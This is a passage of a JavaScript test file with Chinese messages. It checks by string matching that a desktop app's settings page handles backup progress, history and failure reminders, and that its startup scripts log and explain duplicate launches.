  assert.ok(view.includes('api.backup.onEvent'), '设置页未订阅备份进度事件')
  assert.ok(view.includes('history'), '设置页未展示备份历史')
  assert.ok(view.includes('lastFailed'), '设置页缺少失败常驻提醒')
})

test('启动体验：双开有日志，launch 对早退有提示', () => {
  const idx = readFileSync('src/main/index.ts', 'utf8')
  assert.ok(idx.includes('已有实例在运行'), '双开静默退出缺少日志')
  const launch = readFileSync('scripts/launch.mjs', 'utf8')
  assert.ok(launch.includes('connected = true'), 'launch 未追踪界面就绪状态')
  assert.ok(launch.includes('已在运行'), 'launch 对重复启动缺少人话提示')
})
